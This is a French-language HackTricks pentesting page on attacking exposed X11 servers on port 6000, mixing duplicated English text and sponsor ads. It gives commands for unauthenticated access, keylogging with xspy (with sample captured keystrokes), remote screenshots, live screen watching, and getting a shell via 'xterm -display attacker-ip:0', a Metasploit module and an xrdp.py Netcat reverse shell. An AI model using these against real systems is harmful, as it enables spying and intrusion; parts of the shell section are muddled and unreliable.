# 6000 - Pentesting X11

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes de bugs cryptographiques.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof ne sont lanc√©es que lorsque les clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez la l√©gende du hacker web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) commencez √† gagner gr√¢ce √† vos piratages !

{% embed url="https://hackenproof.com/register" %}

## Informations de base

Le syst√®me X Window (alias X) est un syst√®me de fen√™trage pour les affichages bitmap, qui est courant sur les syst√®mes d'exploitation bas√©s sur UNIX. X fournit le cadre de base pour un environnement bas√© sur une interface graphique. X ne d√©finit pas non plus l'interface utilisateur - chaque programme s'en charge.\
√Ä partir de : [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)

**Port par d√©faut :** 6000
```
PORT       STATE   SERVICE
6000/tcp   open    X11
```
## √ânum√©ration

V√©rifiez la **connexion anonyme :**
```bash
nmap -sV --script x11-access -p <PORT> <IP>
msf> use auxiliary/scanner/x11/open_x11
```
#### √ânum√©ration locale

Le fichier **`.Xauthority`** dans le dossier personnel de l'utilisateur est **utilis√©** par **X11 pour l'autorisation**. D'apr√®s [**ici**](https://stackoverflow.com/a/37367518):

> MIT-magic-cookie-1: G√©n√©ration de 128 bits de cl√© ("cookie"), stockage dans \~/.Xauthority (ou l√† o√π la variable d'environnement XAUTHORITY pointe). Le client l'envoie au serveur en clair ! Le serveur v√©rifie s'il a une copie de ce "cookie" et si c'est le cas, la connexion est autoris√©e. La cl√© est g√©n√©r√©e par DMX.

{% hint style="warning" %}
Pour **utiliser le cookie**, vous devez d√©finir la variable d'environnement : **`export XAUTHORITY=/chemin/vers/.Xauthority`**
{% endhint %}

## V√©rifier la connexion
```bash
xdpyinfo -display <ip>:<display>
xwininfo -root -tree -display <IP>:<display> #Ex: xwininfo -root -tree -display 10.5.5.12:0
```
## Keyloggin

[xspy](http://tools.kali.org/sniffingspoofing/xspy) pour intercepter les frappes du clavier.

Exemple de sortie :
```
xspy 10.9.xx.xx

opened 10.9.xx.xx:0 for snoopng
swaBackSpaceCaps_Lock josephtTabcBackSpaceShift_L workShift_L 2123
qsaminusKP_Down KP_Begin KP_Down KP_Left KP_Insert TabRightLeftRightDeletebTabDownnTabKP_End KP_Right KP_Up KP_Down KP_Up KP_Up TabmtminusdBackSpacewinTab
```
## Capture d'√©cran

Lors de la r√©alisation d'un test de p√©n√©tration sur un serveur X11, il peut √™tre utile de capturer des captures d'√©cran pour documenter les actions effectu√©es et les r√©sultats obtenus. Les captures d'√©cran peuvent √©galement √™tre utilis√©es pour illustrer les vuln√©rabilit√©s d√©couvertes lors du test.

Pour capturer des captures d'√©cran sur un serveur X11, vous pouvez utiliser l'outil `xwd`. Cet outil est g√©n√©ralement inclus dans les distributions Linux et est utilis√© pour capturer des images de fen√™tres X11.

Pour capturer une capture d'√©cran, vous pouvez ex√©cuter la commande suivante :

```
xwd -root -out screenshot.xwd
```

Cette commande capturera une image de l'√©cran entier et la sauvegardera dans un fichier nomm√© `screenshot.xwd`. Vous pouvez ensuite convertir ce fichier dans un format plus courant, tel que PNG, en utilisant l'outil `convert` de la suite logicielle ImageMagick :

```
convert screenshot.xwd screenshot.png
```

Une fois que vous avez captur√© une capture d'√©cran, vous pouvez l'inclure dans votre rapport de test de p√©n√©tration pour fournir des preuves visuelles des vuln√©rabilit√©s d√©couvertes.

Il est important de noter que la capture d'√©cran peut r√©v√©ler des informations sensibles, telles que des informations d'identification ou des donn√©es confidentielles. Assurez-vous de prendre les mesures appropri√©es pour prot√©ger ces informations lors de la capture et du partage des captures d'√©cran.
```bash
xwd -root -screen -silent -display <TargetIP:0> > screenshot.xwd
convert screenshot.xwd screenshot.png
```
## Affichage du bureau √† distance

Source : [https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref](https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref)
```
./xrdp.py <IP:0>
```
Voici comment trouver l'ID de la fen√™tre en utilisant xwininfo.
```
xwininfo -root -display 10.9.xx.xx:0

xwininfo: Window id: 0x45 (the root window) (has no name)

Absolute upper-left X:  0
Absolute upper-left Y:  0
Relative upper-left X:  0
Relative upper-left Y:  0
Width: 1024
Height: 768
Depth: 16
Visual: 0x21
Visual Class: TrueColor
Border width: 0
Class: InputOutput
Colormap: 0x20 (installed)
Bit Gravity State: ForgetGravity
Window Gravity State: NorthWestGravity
Backing Store State: NotUseful
Save Under State: no
Map State: IsViewable
Override Redirect State: no
Corners:  +0+0  -0+0  -0-0  +0-0
-geometry 1024x768+0+0
```
**XWatchwin**

Pour **visualiser en direct**, nous devons utiliser
```bash
./xwatchwin [-v] [-u UpdateTime] DisplayName { -w windowID | WindowName } -w window Id is the one found on xwininfo
./xwatchwin 10.9.xx.xx:0 -w 0x45
```
## Obtenir un Shell

To get a shell on a target machine, you can exploit vulnerabilities in the X11 server. The X11 server is responsible for managing graphical user interfaces on Unix-like operating systems.

Pour obtenir un shell sur une machine cible, vous pouvez exploiter les vuln√©rabilit√©s du serveur X11. Le serveur X11 est responsable de la gestion des interfaces utilisateur graphiques sur les syst√®mes d'exploitation de type Unix.

### X11 Forwarding

X11 Forwarding is a feature that allows you to run graphical applications on a remote machine and display them on your local machine. By enabling X11 Forwarding, the remote machine can send the graphical output to your local machine.

La redirection X11 est une fonctionnalit√© qui vous permet d'ex√©cuter des applications graphiques sur une machine distante et de les afficher sur votre machine locale. En activant la redirection X11, la machine distante peut envoyer la sortie graphique vers votre machine locale.

To enable X11 Forwarding, you need to set the `DISPLAY` environment variable to the IP address of your local machine followed by `:0.0`. For example:

Pour activer la redirection X11, vous devez d√©finir la variable d'environnement `DISPLAY` sur l'adresse IP de votre machine locale suivie de `:0.0`. Par exemple :

```bash
export DISPLAY=192.168.0.100:0.0
```

### X11 Server Exploitation

If the target machine has an insecure X11 server configuration, you can exploit it to get a shell. Here are some common methods:

Si la machine cible a une configuration de serveur X11 non s√©curis√©e, vous pouvez l'exploiter pour obtenir un shell. Voici quelques m√©thodes courantes :

#### X11 Port Forwarding

You can use SSH port forwarding to forward the X11 port from the target machine to your local machine. This allows you to connect to the X11 server running on the target machine.

Vous pouvez utiliser la redirection de port SSH pour rediriger le port X11 de la machine cible vers votre machine locale. Cela vous permet de vous connecter au serveur X11 en cours d'ex√©cution sur la machine cible.

```bash
ssh -X user@target-machine
```

#### X11 Reverse Shell

If you have the ability to run commands on the target machine, you can create a reverse shell using the `xterm` command. This will open an X11 terminal on your local machine that is connected to the target machine.

Si vous avez la possibilit√© d'ex√©cuter des commandes sur la machine cible, vous pouvez cr√©er un shell invers√© en utilisant la commande `xterm`. Cela ouvrira un terminal X11 sur votre machine locale qui est connect√© √† la machine cible.

```bash
xterm -display attacker-ip:0
```

Replace `attacker-ip` with the IP address of your machine.

Remplacez `attacker-ip` par l'adresse IP de votre machine.

### Conclusion

Exploiting vulnerabilities in the X11 server can provide you with a shell on a target machine. By using X11 Forwarding or X11 server exploitation techniques, you can gain remote access and control over the target machine.
```
msf> use exploit/unix/x11/x11_keyboard_exec
```
Autre m√©thode:

**Reverse Shell:** Xrdp permet √©galement de prendre un reverse shell via Netcat. Tapez la commande suivante:

**./xrdp.py \<IP:0> ‚Äìno-disp**

![](../.gitbook/assets/112217\_0051\_ExploitingX15.jpeg)

Une nouvelle fen√™tre de contr√¥le s'affiche, o√π nous pouvons voir l'option R-shell, comme illustr√© ci-dessous:

![](../.gitbook/assets/112217\_0051\_ExploitingX16.jpeg)

Nous allons d√©marrer le mode d'√©coute de Netcat sur notre syst√®me local sur le port 5555, comme illustr√© ci-dessous:

![](../.gitbook/assets/112217\_0051\_ExploitingX17.jpeg)

Ensuite, ajoutez l'adresse IP et le port, puis s√©lectionnez R-Shell, comme illustr√© ci-dessous:

![](../.gitbook/assets/112217\_0051\_ExploitingX18.jpeg)

Maintenant, comme on peut le voir ci-dessous, nous avons un acc√®s complet au syst√®me:

![](../.gitbook/assets/112217\_0051\_ExploitingX19.jpeg)

{% embed url="https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref" %}

## Shodan

* `port:6000 x11`

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes pour les bugs de cryptographie.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof sont lanc√©es uniquement lorsque les clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez une l√©gende du hacking web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez √† gagner gr√¢ce √† vos hacks !

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Vous travaillez dans une **entreprise de cybers√©curit√©** ? Vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ? ou souhaitez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
